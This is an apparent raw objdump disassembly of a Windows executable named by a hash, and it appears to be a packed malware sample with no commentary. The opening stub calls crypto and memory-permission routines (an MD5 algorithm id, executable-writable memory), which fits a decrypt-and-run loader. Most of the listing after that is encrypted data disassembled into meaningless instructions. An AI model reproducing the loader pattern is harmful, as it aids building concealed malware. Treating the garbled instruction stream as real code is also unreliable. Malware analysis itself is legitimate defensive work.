
399300ccba28ab8ab9898ee3999598863b45497450d7707a4da06b227cb8a139.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    DWORD PTR [ebp-0x48],0x0
  40100d:	mov    DWORD PTR [ebp-0x18],0x0
  401014:	mov    DWORD PTR [ebp-0x70],0x0
  40101b:	mov    DWORD PTR [ebp-0x60],0x0
  401022:	mov    DWORD PTR [ebp-0x8],0x0
  401029:	mov    DWORD PTR [ebp-0x6c],0x0
  401030:	mov    DWORD PTR [ebp-0x68],0x0
  401037:	mov    DWORD PTR [ebp-0x14],0x0
  40103e:	mov    DWORD PTR [ebp-0x4c],0x0
  401045:	mov    DWORD PTR [ebp-0x10],0x0
  40104c:	mov    DWORD PTR [ebp-0x58],0x0
  401053:	mov    DWORD PTR [ebp-0x4],0x0
  40105a:	mov    DWORD PTR [ebp-0x5c],0x0
  401061:	mov    DWORD PTR [ebp-0x30],0x0
  401068:	mov    DWORD PTR [ebp-0x54],0x0
  40106f:	mov    DWORD PTR [ebp-0x2c],0x0
  401076:	mov    DWORD PTR [ebp-0x50],0x0
  40107d:	mov    DWORD PTR [ebp-0xc],0x0
  401084:	mov    eax,ds:0x4493e8
  401089:	mov    DWORD PTR [ebp-0x28],eax
  40108c:	mov    ecx,DWORD PTR ds:0x4493ec
  401092:	mov    DWORD PTR [ebp-0x24],ecx
  401095:	mov    edx,DWORD PTR ds:0x4493f0
  40109b:	mov    DWORD PTR [ebp-0x20],edx
  40109e:	mov    al,ds:0x4493f4
  4010a3:	mov    BYTE PTR [ebp-0x1c],al
  4010a6:	mov    ecx,DWORD PTR ds:0x4493f8
  4010ac:	mov    DWORD PTR [ebp-0x40],ecx
  4010af:	mov    edx,DWORD PTR ds:0x4493fc
  4010b5:	mov    DWORD PTR [ebp-0x3c],edx
  4010b8:	mov    eax,ds:0x449400
  4010bd:	mov    DWORD PTR [ebp-0x38],eax
  4010c0:	mov    cx,WORD PTR ds:0x449404
  4010c7:	mov    WORD PTR [ebp-0x34],cx
  4010cb:	mov    dl,BYTE PTR ds:0x449406
  4010d1:	mov    BYTE PTR [ebp-0x32],dl
  4010d4:	mov    DWORD PTR [ebp-0x30],0x40
  4010db:	lea    eax,[ebp-0x40]
  4010de:	push   eax
  4010df:	lea    ecx,[ebp-0x10]
  4010e2:	push   ecx
  4010e3:	call   DWORD PTR ds:0x417004
  4010e9:	test   eax,eax
  4010eb:	je     0x41534a
  4010f1:	push   0x1
  4010f3:	lea    edx,[ebp-0x10]
  4010f6:	push   edx
  4010f7:	call   DWORD PTR ds:0x417008
  4010fd:	lea    eax,[ebp-0x10]
  401100:	push   eax
  401101:	push   0x0
  401103:	push   0x0
  401105:	push   0x1
  401107:	call   DWORD PTR ds:0x41700c
  40110d:	mov    ecx,DWORD PTR [ebp-0x10]
  401110:	add    ecx,0x1
  401113:	mov    DWORD PTR [ebp-0x10],ecx
  401116:	lea    edx,[ebp-0x30]
  401119:	push   edx
  40111a:	lea    eax,[ebp-0x50]
  40111d:	push   eax
  40111e:	push   0x40
  401120:	push   0x7
  401122:	push   0x0
  401124:	mov    ecx,DWORD PTR [ebp-0x50]
  401127:	push   ecx
  401128:	call   DWORD PTR ds:0x417000
  40112e:	lea    edx,[ebp-0x50]
  401131:	push   edx
  401132:	push   0x0
  401134:	push   0x8003
  401139:	mov    eax,DWORD PTR [ebp-0x50]
  40113c:	push   eax
  40113d:	call   DWORD PTR ds:0x417010
  401143:	lea    ecx,[ebp-0x50]
  401146:	push   ecx
  401147:	push   0x0
  401149:	push   0x0
  40114b:	push   0x8003
  401150:	mov    edx,DWORD PTR [ebp-0x50]
  401153:	push   edx
  401154:	call   DWORD PTR ds:0x417018
  40115a:	lea    eax,[ebp-0x50]
  40115d:	push   eax
  40115e:	push   0x0
  401160:	push   0x0
  401162:	push   0x0
  401164:	mov    ecx,DWORD PTR [ebp-0x50]
  401167:	push   ecx
  401168:	call   DWORD PTR ds:0x417014
  40116e:	scas   eax,DWORD PTR es:[edi]
  40116f:	inc    ebx
  401170:	cmp    BYTE PTR [esi],ah
  401172:	sbb    al,0x6b
  401174:	mov    al,ds:0x40de9862
  401179:	daa    
  40117a:	push   esp
  40117b:	cmp    ah,bh
  40117d:	aad    0xf
  40117f:	push   edx
  401180:	aaa    
  401181:	sar    BYTE PTR [eax+ecx*1],1
  401184:	push   ds
  401185:	xchg   ebx,eax
  401186:	adc    edx,DWORD PTR [esi+0x19]
  401189:	mov    bh,0x69
  40118b:	adc    ebx,edi
  40118d:	xor    BYTE PTR [ecx-0x63],cl
  401190:	nop
  401191:	imul   esi,DWORD PTR [esi],0x6a
  401194:	push   esi
  401195:	mov    ah,0x65
  401197:	sbb    DWORD PTR [eax+0x2e],ebx
  40119a:	scas   eax,DWORD PTR es:[edi]
  40119b:	sti    
  40119c:	push   eax
  40119d:	mov    dh,0x91
  40119f:	stos   DWORD PTR es:[edi],eax
  4011a0:	cmp    BYTE PTR [edi+0x2f],0x52
  4011a4:	xchg   esp,eax
  4011a5:	jbe    0x40119c
  4011a7:	stos   DWORD PTR es:[edi],eax
  4011a8:	ss das 
  4011aa:	or     DWORD PTR [ebx],ecx
  4011ac:	dec    ecx
  4011ad:	sbb    BYTE PTR es:[edx+0x6e21000c],dh
  4011b4:	mul    DWORD PTR [ebp+0x36]
  4011b7:	aad    0x1e
  4011b9:	out    dx,eax
  4011ba:	dec    ebx
  4011bb:	xor    esi,edi
  4011bd:	ins    DWORD PTR es:[edi],dx
  4011be:	loopne 0x4011f0
  4011c0:	and    esi,DWORD PTR [ebx]
  4011c2:	jb     0x4011e2
  4011c4:	shr    BYTE PTR [ecx],cl
  4011c6:	shr    BYTE PTR ds:0x4a91fc66,cl
  4011cc:	cmp    edx,0xdf82f18e
  4011d2:	rol    ebx,0xfb
  4011d5:	push   ebp
  4011d6:	out    dx,eax
  4011d7:	popf   
  4011d8:	div    BYTE PTR ds:0x5572ff58
  4011de:	dec    esp
  4011df:	jmp    0xb52f:0xf0a32b4
  4011e6:	xchg   edi,eax
  4011e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4011e8:	add    cl,0x25
  4011eb:	mov    DWORD PTR [ebx],eax
  4011ed:	faddp  st(6),st
  4011ef:	aad    0x4b
  4011f1:	jecxz  0x4011c3
  4011f3:	dec    ecx
  4011f4:	les    ecx,FWORD PTR [edi+0xf]
  4011f7:	mov    WORD PTR [ecx+edi*8],ds
  4011fa:	int3   
  4011fb:	jb     0x4011e2
  4011fd:	scas   eax,DWORD PTR es:[edi]
  4011fe:	add    eax,0xb9dc59e2
  401203:	inc    esp
  401204:	add    DWORD PTR [edx+0x432285fa],0xca5bb728
  40120e:	call   0x27a5:0x441fdf33
  401215:	adc    eax,0x60856998
  40121a:	xor    ah,dh
  40121c:	pop    eax
  40121d:	push   ss
  40121e:	sar    cl,cl
  401220:	cwde   
  401221:	jmp    0x4011b8
  401223:	xchg   edi,eax
  401224:	dec    edi
  401225:	mov    esp,DWORD PTR [esi+0x196579d2]
  40122b:	nop
  40122c:	pop    eax
  40122d:	cld    
  40122e:	outs   dx,DWORD PTR ds:[esi]
  40122f:	shl    BYTE PTR [ecx+0x29],1
  401232:	test   BYTE PTR [ecx],bh
  401234:	in     eax,dx
  401235:	pop    esi
  401236:	dec    ecx
  401237:	ret    0x3c08
  40123a:	ror    BYTE PTR gs:[esi+0x41],cl
  40123e:	jo     0x40121c
  401240:	pop    edi
  401241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401242:	test   BYTE PTR [ebx+0x4e],al
  401245:	ins    DWORD PTR es:[edi],dx
  401246:	or     bl,BYTE PTR [edx-0x748f02fc]
  40124c:	and    BYTE PTR [esi+0x2e4e5e92],0xe4
  401253:	es dec edx
  401255:	add    al,BYTE PTR [edx+0x8]
  401258:	fild   DWORD PTR [edx+0x697b9da0]
  40125e:	mov    al,0xd
  401260:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401261:	test   eax,0x614fad38
  401266:	jmp    0x1ed1:0xf8e15590
  40126d:	jmp    0x4012b1
  40126f:	pop    esi
  401270:	inc    esp
  401271:	mov    esp,eax
  401273:	fldl2e 
  401275:	shr    edx,cl
  401277:	out    0x80,eax
  401279:	jno    0x4012c1
  40127b:	fld    QWORD PTR [ebx]
  40127d:	add    al,0x66
  40127f:	add    al,0x4b
  401281:	inc    esp
  401282:	cmp    BYTE PTR [edi],bh
  401284:	sar    BYTE PTR [eax-0x3cb9c14d],1
  40128a:	lahf   
  40128b:	sub    al,BYTE PTR [esi+ebx*2+0x6a16dd6f]
  401292:	add    eax,DWORD PTR [eax+eax*4+0x23]
  401296:	sahf   
  401297:	mov    eax,ds:0xad7b784c
  40129c:	retf   0x982f
  40129f:	lods   al,BYTE PTR ds:[esi]
  4012a0:	je     0x4012d2
  4012a2:	sub    ebp,0x6
  4012a5:	lock es enter 0xa1cb,0xc1
  4012ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012ac:	fstp   TBYTE PTR [edi]
  4012ae:	inc    ebp
  4012af:	mov    WORD PTR [esi-0x10],sp
  4012b3:	imul   ebp,DWORD PTR [edx+ebx*4+0x667c6d1e],0x24
  4012bb:	retf   
  4012bc:	pop    ecx
  4012bd:	xor    eax,0x7b253c60
  4012c2:	(bad)  
  4012c3:	loopne 0x401333
  4012c5:	mov    ds:0x8b427a4c,al
  4012ca:	push   ebp
  4012cb:	or     esp,DWORD PTR [edi]
  4012cd:	lods   al,BYTE PTR ds:[esi]
  4012ce:	xchg   edx,eax
  4012cf:	jl     0x401268
  4012d1:	jne    0x401316
  4012d3:	retf   0xd200
  4012d6:	mov    edx,0x47d41db6
  4012db:	sub    al,0x1d
  4012dd:	out    dx,al
  4012de:	outs   dx,DWORD PTR ds:[esi]
  4012df:	dec    ebp
  4012e0:	lods   al,BYTE PTR ds:[esi]
  4012e1:	mov    ?,WORD PTR [esi+0x2314de70]
  4012e7:	test   BYTE PTR [ebx+0x76],0xf2
  4012eb:	lock div BYTE PTR ds:0xd6461ea8
  4012f2:	xor    ebp,DWORD PTR [ecx+edi*1]
  4012f5:	ss inc ebx
  4012f7:	nop
  4012f8:	aas    
  4012f9:	out    dx,al
  4012fa:	cwde   
  4012fb:	cwde   
  4012fc:	pop    ebp
  4012fd:	mov    ds,WORD PTR [esp+esi*8-0x4140f78e]
  401304:	sub    al,0xe5
  401306:	loope  0x4012f0
  401308:	xchg   edx,eax
  401309:	fld    TBYTE PTR [ecx]
  40130b:	sub    eax,0xba56b976
  401310:	add    al,0x3e
  401312:	mov    DWORD PTR [ecx+0x62],esp
  401315:	sahf   
  401316:	ins    DWORD PTR es:[edi],dx
  401317:	cmp    DWORD PTR [ecx+0x72],ebx
  40131a:	imul   edi,DWORD PTR [eax+0x5b],0x50c396fa
  401321:	xor    al,0xf3
  401323:	mov    ebx,0x77756cf8
  401328:	jb     0x401384
  40132a:	fst    DWORD PTR [ecx+0xc]
  40132d:	loop   0x4012b8
  40132f:	popf   
  401330:	or     eax,0xaac025bb
  401335:	adc    cl,BYTE PTR [ebx]
  401337:	sar    DWORD PTR [eax-0x14c0491],0x8f
  40133e:	cli    
  40133f:	adc    BYTE PTR [ebp-0x3b],bh
  401342:	pop    esi
  401343:	ins    DWORD PTR es:[edi],dx
  401344:	fild   QWORD PTR [edx-0x17]
  401347:	inc    edx
  401348:	in     al,0x98
  40134a:	jle    0x401337
  40134c:	adc    al,0xf3
  40134e:	cmp    eax,0x4650a369
  401353:	out    0x7a,al
  401355:	xor    DWORD PTR [esi+0x47],ebp
  401358:	icebp  
  401359:	cmp    DWORD PTR [edi-0x2bd2aad3],ecx
  40135f:	cs stos BYTE PTR es:[edi],al
  401361:	in     eax,0xa7
  401363:	int    0x93
  401365:	and    eax,0x93731b2c
  40136a:	stos   DWORD PTR es:[edi],eax
  40136b:	out    0x28,eax
  40136d:	imul   esi,edi,0xaf960633
  401373:	sti    
  401374:	and    DWORD PTR [esi],0xffffffb3
  401377:	test   DWORD PTR [ecx-0x71befe6d],esp
  40137d:	mov    WORD PTR [ebx+0x19728223],ss
  401383:	dec    ebp
  401384:	test   eax,0x810cb87e
  40138a:	int    0x3
  40138c:	pop    edx
  40138d:	dec    ebp
  40138e:	jo     0x4013aa
  401390:	xchg   edi,eax
  401391:	ret    0x30e9
  401394:	xor    ecx,DWORD PTR [esi-0x77]
  401397:	inc    eax
  401398:	ret    0x77c8
  40139b:	repz out dx,eax
  40139d:	push   esi
  40139e:	arpl   WORD PTR [ebp+0x2b7e8b25],bx
  4013a4:	ja     0x4013f1
  4013a6:	lea    esp,[edi+ebx*4+0x3c]
  4013aa:	out    dx,eax
  4013ab:	iret   
  4013ac:	cdq    
  4013ad:	xlat   BYTE PTR ds:[ebx]
  4013ae:	mov    ah,0xeb
  4013b0:	xchg   esp,eax
  4013b1:	and    ebp,DWORD PTR [ebx+0x12]
  4013b4:	mov    edx,0x85a1df
  4013b9:	out    0x49,eax
  4013bb:	sahf   
  4013bc:	imul   ebp,DWORD PTR [ebx-0x28264311],0xef605d7b
  4013c6:	hlt    
  4013c7:	xchg   ebp,eax
  4013c8:	repz and DWORD PTR [ebx-0x2d],0xffffff82
  4013cd:	add    edx,edi
  4013cf:	mov    bl,0xbf
  4013d1:	add    BYTE PTR [edx-0x761f3b88],cl
  4013d7:	inc    ebx
  4013d8:	mov    edi,0x4c0ec080
  4013dd:	xor    ebx,ebx
  4013df:	xor    esi,ecx
  4013e1:	mov    ds:0xd6e28e8a,al
  4013e6:	lods   al,BYTE PTR ds:[esi]
  4013e7:	fst    DWORD PTR [ecx]
  4013e9:	sbb    bh,BYTE PTR [ebx+0x5c]
  4013ec:	jno    0x4013ae
  4013ee:	mov    dh,0x40
  4013f0:	and    al,0xd
  4013f2:	ins    BYTE PTR es:[edi],dx
  4013f3:	sub    ch,bl
  4013f5:	repnz cmp ah,BYTE PTR [edx+0x6d]
  4013f9:	sub    dh,BYTE PTR cs:[eax-0x15]
  4013fd:	retf   
  4013fe:	iret   
  4013ff:	bswap  ebx
  401401:	cmp    esp,DWORD PTR [eax+0x56984f54]
  401407:	cmp    eax,0xc1a8ac4
  40140c:	mov    bl,0x81
  40140e:	cli    
  40140f:	xor    DWORD PTR [ecx-0x4a],edi
  401412:	mov    edi,0x1e2cc26f
  401417:	jbe    0x4013df
  401419:	call   0x1c5a:0xab05754
  401420:	(bad)  
  401422:	inc    esp
  401423:	fwait
  401424:	ins    DWORD PTR es:[edi],dx
  401425:	(bad)  
  401426:	loop   0x401413
  401428:	das    
  401429:	xchg   BYTE PTR [ecx],bh
  40142b:	(bad)  
  40142c:	cmp    BYTE PTR [edi],ch
  40142e:	ss push ecx
  401430:	jnp    0x40144e
  401432:	cld    
  401433:	jnp    0x40145a
  401435:	iret   
  401436:	dec    edx
  401437:	sub    DWORD PTR [edi],esi
  401439:	or     al,0x76
  40143b:	fadd   QWORD PTR [ecx]
  40143d:	mov    dh,0x35
  40143f:	mov    ds:0xc95b754c,eax
  401444:	lods   al,BYTE PTR ds:[esi]
  401445:	aaa    
  401446:	js     0x401481
  401448:	in     al,dx
  401449:	push   eax
  40144a:	jbe    0x401487
  40144c:	pop    ebp
  40144d:	enter  0x2416,0x37
  401451:	adc    esp,DWORD PTR [ecx-0x24a32a5b]
  401457:	push   ss
  401458:	mov    bl,0x5b
  40145a:	fldenv [ebx-0xd]
  40145d:	fdivr  DWORD PTR [esi+esi*1-0x1b0956c1]
  401464:	outs   dx,DWORD PTR ds:[esi]
  401465:	int3   
  401466:	loop   0x4014c2
  401468:	test   al,0xcf
  40146a:	mov    DWORD PTR [edx],esi
  40146c:	mov    ds:0x1b306f45,eax
  401471:	ss push ss
  401473:	add    BYTE PTR [edi-0x3e15378c],0x60
  40147a:	out    dx,al
  40147b:	fwait
  40147c:	jp     0x4014e3
  40147e:	popa   
  40147f:	pop    ss
  401480:	mov    bl,0x64
  401482:	int    0x7d
  401484:	iret   
  401485:	cmp    edi,DWORD PTR [edi+eiz*2+0xc]
  401489:	(bad)  
  40148a:	pop    esi
  40148b:	int3   
  40148c:	sar    ah,1
  40148e:	ins    BYTE PTR es:[edi],dx
  40148f:	xor    BYTE PTR [esi-0x1a15f8c1],0xee
  401496:	jmp    0x13b5ebf0
  40149b:	mov    ds:0xed5454ff,eax
  4014a0:	push   es
  4014a1:	test   DWORD PTR [edi-0x31],ebp
  4014a4:	mov    ch,0x69
  4014a6:	nop
  4014a7:	dec    esi
  4014a8:	pop    ds
  4014a9:	add    al,BYTE PTR cs:[ebx+edi*2+0x13]
  4014ae:	rcl    DWORD PTR [edx+0x67],1
  4014b1:	loop   0x401477
  4014b3:	cwde   
  4014b4:	inc    ebx
  4014b5:	jmp    0x4014f2
  4014b7:	int3   
  4014b8:	jae    0x4014d2
  4014ba:	(bad)  
  4014bb:	and    al,0xa4
  4014bd:	fld    TBYTE PTR [eax-0x1836be93]
  4014c3:	pop    ecx
  4014c4:	aas    
  4014c5:	fs jg  0x401493
  4014c8:	shr    BYTE PTR [edi+0x13],0x11
  4014cc:	mov    esi,0xb9a52e55
  4014d1:	(bad)
  4014d5:	les    eax,FWORD PTR [eax]
  4014d7:	mov    bh,0xcc
  4014d9:	mov    ds:0x2abd9957,al
  4014de:	sahf   
  4014df:	retf   0x9878
  4014e2:	ins    DWORD PTR es:[edi],dx
  4014e3:	mov    ss,WORD PTR [eax+0x150d5276]
  4014e9:	dec    esp
  4014ea:	sti    
  4014eb:	mov    bh,0x8e
  4014ed:	jmp    0x5fcb:0x2ab8f1be
  4014f4:	or     eax,0x7aef96e6
  4014f9:	mov    ecx,0xf4f70d38
  4014fe:	push   0xc32d023c
  401503:	clc    
  401504:	aam    0x5d
  401506:	dec    ebx
  401507:	out    dx,al
  401508:	sub    eax,DWORD PTR [edx+0x787c744]
  40150e:	(bad)  
  40150f:	leave  
  401510:	xor    edi,ecx
  401512:	clc    
  401513:	mov    al,0xb3
  401515:	pop    edi
  401516:	adc    al,0x43
  401518:	(bad)  
  401519:	mov    edi,0x16be2578
  40151e:	push   ds
  40151f:	mov    ds:0x6d133cad,eax
  401524:	fidivr DWORD PTR [ecx-0x6c]
  401527:	inc    ebx
  401528:	std    
  401529:	retf   
  40152a:	hlt    
  40152b:	push   eax
  40152c:	add    DWORD PTR [esi-0x7],ecx
  40152f:	jo     0x4014c7
  401531:	mov    WORD PTR [ebp+0x59],ds
  401534:	mov    ebx,DWORD PTR [eax+0x528b1032]
  40153a:	jnp    0x401515
  40153c:	push   0x392df259
  401541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401542:	xchg   edi,eax
  401543:	js     0x401553
  401545:	es xchg edi,eax
  401547:	repz rol DWORD PTR [edx-0x6c],0x40
  40154c:	enter  0xf2db,0x95
  401550:	dec    eax
  401551:	fsubr  st(4),st
  401553:	mov    eax,0x3fe24d11
  401558:	in     al,0x31
  40155a:	inc    esi
  40155b:	add    dh,bl
  40155d:	pop    esi
  40155e:	mov    ecx,0x5157127d
  401563:	retf   0x298d
  401566:	cmp    ebp,edx
  401568:	and    esp,edi
  40156a:	dec    ebx
  40156b:	mov    ch,0xb6
  40156d:	sbb    al,0xe8
  40156f:	xlat   BYTE PTR ds:[ebx]
  401570:	and    eax,0x91a92baf
  401575:	pop    esi
  401576:	sub    ah,dh
  401578:	fst    DWORD PTR [edx+ebx*1]
  40157b:	pop    esi
  40157c:	xor    edi,ecx
  40157e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40157f:	mov    dl,0x4b
  401581:	pop    ds
  401582:	rep lods al,BYTE PTR ds:[esi]
  401584:	xor    edi,DWORD PTR [ebx+0x63]
  401587:	push   ss
  401588:	add    BYTE PTR [ebx],cl
  40158a:	sub    DWORD PTR cs:[edi-0x74],edi
  40158e:	retf   0x9b09
  401591:	(bad)  
  401592:	jo     0x401569
  401594:	iret   
  401595:	stos   BYTE PTR es:[edi],al
  401596:	aas    
  401597:	push   ds
  401598:	sub    ah,BYTE PTR [esp+eiz*2-0x6e]
  40159c:	rcl    DWORD PTR [esi],0x87
  40159f:	sbb    bh,BYTE PTR [edx]
  4015a1:	or     edx,DWORD PTR [ecx+0x1de81e18]
  4015a7:	jae    0x4015e7
  4015a9:	push   0xb200b22f
  4015ae:	mov    esp,0x167a9735
  4015b3:	cwde   
  4015b4:	clc    
  4015b5:	aad    0xf7
  4015b7:	ins    DWORD PTR es:[edi],dx
  4015b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015b9:	(bad)  
  4015ba:	hlt    
  4015bb:	jecxz  0x4015f8
  4015bd:	pop    edx
  4015be:	ret    
  4015bf:	cmp    al,0xc5
  4015c1:	mov    ds,WORD PTR [ecx+ecx*1]
  4015c4:	adc    dh,ah
  4015c6:	div    cl
  4015c8:	loopne 0x40159e
  4015ca:	mov    eax,ds:0xf5335e5c
  4015cf:	sbb    DWORD PTR [ecx-0x5e0d0330],esi
  4015d5:	mov    BYTE PTR [ebp-0x2c],0xfd
  4015d9:	mov    bh,cl
  4015db:	push   cs
  4015dc:	cs (bad) 
  4015de:	jmp    0x13561dba
  4015e3:	loop   0x4015ca
  4015e5:	jnp    0x401595
  4015e7:	into   
  4015e8:	js     0x4015f8
  4015ea:	lds    eax,FWORD PTR [eax-0x34]
  4015ed:	(bad)  
  4015ee:	pop    ebx
  4015ef:	sahf   
  4015f0:	jns    0x40163e
  4015f2:	push   0x4450165a
  4015f7:	cmp    al,0x88
  4015f9:	daa    
  4015fa:	aas    
  4015fb:	(bad)  
  4015fc:	repz fidiv WORD PTR [esi-0x69]
  401600:	fadd   QWORD PTR ds:0xa773508d
  401606:	mov    eax,0xfef93017
  40160b:	push   esp
  40160c:	pop    esp
  40160d:	mov    cl,0x8f
  401610:	jno    0x40167c
  401612:	jbe    0x401677
  401614:	imul   ebp,DWORD PTR [edx],0xffffffde
  401617:	hlt    
  401618:	fild   QWORD PTR [esi-0x51162b34]
  40161e:	cdq    
  40161f:	pop    edx
  401620:	add    al,0x23
  401622:	cld    
  401623:	or     ecx,DWORD PTR [ecx]
  401625:	or     eax,0x3f255eac
  40162a:	inc    eax
  40162b:	bound  ecx,QWORD PTR [ecx]
  40162d:	fs add edi,ebp
  401630:	ss aaa 
  401632:	fldcw  WORD PTR [ecx+0x71388a74]
  401638:	lds    eax,FWORD PTR [ebp-0xeb9eb9f]
  40163e:	and    eax,0x3709b93f
  401643:	mov    cl,0x5a
  401645:	or     eax,0x9eeb65e1
  40164a:	enter  0x849f,0xac
  40164e:	call   0xc747a5e2
  401653:	jns    0x4015f9
  401655:	jge    0x401689
  401657:	lahf   
  401658:	jecxz  0x4015ee
  40165a:	jmp    0x40169c
  40165c:	inc    ebx
  40165d:	repz xchg edx,eax
  40165f:	mov    edx,0xea348171
  401664:	icebp  
  401665:	hlt    
  401666:	add    al,0xe6
  401668:	mov    ebp,?
  40166a:	mov    ah,0x3c
  40166c:	cmp    esi,DWORD PTR [edi]
  40166e:	lea    esi,[edx+0x813131d]
  401674:	imul   eax,DWORD PTR [edi],0xffffff8d
  401677:	xchg   ebx,eax
  401678:	push   0xa7c51f11
  40167d:	add    al,0x7d
  40167f:	sbb    eax,0x6be01bd8
  401684:	mov    WORD PTR [ecx],fs
  401686:	rcl    cl,1
  401688:	mov    ds:0x874f7dcd,al
  40168d:	ja     0x40161f
  40168f:	sahf   
  401690:	popa   
  401691:	in     eax,dx
  401692:	pop    es
  401693:	imul   esi,DWORD PTR [eax+0x3594c3f5],0xffffffdf
  40169a:	(bad)  
  40169b:	fidivr DWORD PTR [ebx]
  40169d:	xlat   BYTE PTR ds:[ebx]
  40169e:	in     eax,0x3f
  4016a0:	scas   eax,DWORD PTR es:[edi]
  4016a1:	add    DWORD PTR [ebx-0x1],esp
  4016a4:	push   ebp
  4016a5:	mov    bh,0xba
  4016a7:	(bad)  
  4016a8:	loop   0x4016b9
  4016aa:	loope  0x4016b0
  4016ac:	inc    edi
  4016ad:	fdivrp st(1),st
  4016af:	mov    ds:0x46819095,al
  4016b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016b5:	push   esp
  4016b6:	sahf   
  4016b7:	imul   ebx,DWORD PTR [ebx+0x2570fed1],0xffffff9d
  4016be:	pop    esi
  4016bf:	shl    BYTE PTR [eax],1
  4016c1:	hlt    
  4016c2:	std    
  4016c3:	data16 in al,dx
  4016c5:	sbb    eax,0xd4d315f6
  4016ca:	pop    esi
  4016cb:	pop    ebp
  4016cc:	loopne 0x4016e8
  4016ce:	jmp    0xe8e7:0xc4c50466
  4016d5:	test   BYTE PTR [eax-0x3d3b4754],0xaf
  4016dc:	das    
  4016dd:	jns    0x4016dd
  4016df:	sub    DWORD PTR [ebp+0x74],edi
  4016e2:	sub    al,al
  4016e4:	dec    ebp
  4016e5:	sti    
  4016e6:	add    eax,0xf56d34c8
  4016eb:	pop    edi
  4016ec:	add    cl,BYTE PTR [ebp+0x6fe18d5f]
  4016f2:	jle    0x401746
  4016f4:	mov    BYTE PTR [ebx+esi*8+0x33],ch
  4016f8:	mov    DWORD PTR [eax+0x21faac87],ebp
  4016fe:	repz push ebx
  401700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401701:	fwait
  401702:	xchg   esp,eax
  401703:	sub    ah,bh
  401705:	push   ebx
  401706:	mov    edx,0xa63bc5bf
  40170b:	adc    edx,DWORD PTR [edi+0x4d884fae]
  401711:	jno    0x401747
  401713:	and    ch,dh
  401715:	(bad)  
  401716:	in     eax,dx
  401717:	and    dl,BYTE PTR [esi]
  401719:	sbb    eax,DWORD PTR [esi-0x16]
  40171c:	dec    edi
  40171d:	pop    ecx
  40171e:	add    BYTE PTR es:[ecx+0x75218e87],bh
  401725:	mov    dh,0xdd
  401727:	push   es
  401728:	repz inc eax
  40172a:	call   0x89233c11
  40172f:	cmp    dl,BYTE PTR [ecx+ebx*4-0x58]
  401733:	pop    edi
  401734:	mov    cl,0xd9
  401736:	int3   
  401737:	xchg   ebx,eax
  401738:	in     eax,dx
  401739:	mov    dl,0xb3
  40173b:	js     0x401759
  40173d:	sub    DWORD PTR [ecx-0x208f2659],ebx
  401743:	shl    BYTE PTR [ebx-0x61],1
  401746:	stc    
  401747:	fwait
  401748:	out    dx,eax
  401749:	dec    ecx
  40174a:	sub    ax,0x6850
  40174e:	sub    DWORD PTR [ebp+ecx*2+0x3b],eax
  401752:	mov    WORD PTR [ecx+0x56],?
  401755:	rcl    BYTE PTR [ebx-0x79fd063e],0x26
  40175c:	out    dx,eax
  40175d:	mov    al,0xb9
  40175f:	sahf   
  401760:	out    dx,eax
  401761:	jb     0x4017a2
  401763:	cmp    ebx,DWORD PTR [ecx]
  401765:	lahf   
  401766:	push   ebx
  401767:	ret    
  401768:	in     eax,0xd
  40176a:	mov    ebp,0x8a86a0c6
  40176f:	out    dx,al
  401770:	mov    ah,0x3f
  401772:	pop    esi
  401773:	fwait
  401774:	outs   dx,BYTE PTR ds:[esi]
  401775:	jp     0x40170e
  401777:	mov    WORD PTR [esi],cs
  401779:	dec    esi
  40177a:	add    esi,0x6eb738bd
  401780:	jbe    0x4017a8
  401782:	push   edx
  401783:	jo     0x4017d4
  401785:	clc    
  401786:	loope  0x401742
  401788:	push   es
  401789:	sbb    ecx,edi
  40178b:	mov    bl,0x64
  40178d:	xchg   ebx,eax
  40178e:	outs   dx,DWORD PTR ds:[esi]
  40178f:	push   ss
  401790:	mov    ds:0xadae6c3a,eax
  401795:	leave  
  401796:	dec    ecx
  401797:	jmp    0x4017f7
  401799:	sub    eax,0x6a8d7c8a
  40179e:	test   bh,bl
  4017a0:	lods   eax,DWORD PTR ds:[esi]
  4017a1:	hlt    
  4017a2:	stc    
  4017a3:	int    0x16
  4017a5:	(bad)  
  4017a6:	xor    DWORD PTR [ecx+0x18686738],eax
  4017ac:	push   esi
  4017ad:	inc    ebx
  4017ae:	(bad)
  4017b1:	scas   al,BYTE PTR es:[edi]
  4017b2:	jns    0x401801
  4017b4:	ss mov ch,0x47
  4017b7:	(bad)  
  4017b8:	int3   
  4017b9:	idiv   ecx
  4017bb:	cmp    al,0x39
  4017bd:	cmp    al,0xcd
  4017bf:	out    0x3b,al
  4017c1:	in     al,0x82
  4017c3:	mov    bl,0x1b
  4017c5:	add    al,0xf4
  4017c7:	add    al,0xbb
  4017c9:	pop    edi
  4017ca:	mov    ebp,DWORD PTR [ebp+0x1fbe1494]
  4017d0:	xchg   edi,eax
  4017d1:	sub    al,0xf6
  4017d3:	leave  
  4017d4:	fnstsw WORD PTR [ecx+0x2b1cb064]
  4017da:	ret    0x94fc
  4017dd:	ja     0x401830
  4017df:	scas   eax,DWORD PTR es:[edi]
  4017e0:	jbe    0x40183f
  4017e2:	mov    ah,0xdc
  4017e4:	in     al,0xc0
  4017e6:	xor    bl,BYTE PTR gs:[eax-0x21c1b6df]
  4017ed:	pushf  
  4017ee:	leave  
  4017ef:	jae    0x4017ea
  4017f1:	sub    eax,DWORD PTR [edi+0xd71be61]
  4017f7:	and    BYTE PTR [eax],bl
  4017f9:	aad    0x4e
  4017fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017fc:	pop    ebx
  4017fd:	mov    eax,ds:0x88061407
  401802:	jbe    0x401843
  401804:	inc    ebx
  401805:	sbb    al,0xd
  401807:	mov    esp,0x7d0a803c
  40180c:	mov    eax,ds:0x94368367
  401811:	nop
  401812:	and    DWORD PTR [edx],ecx
  401814:	stos   BYTE PTR es:[edi],al
  401815:	jmp    0x40179b
  401817:	cmc    
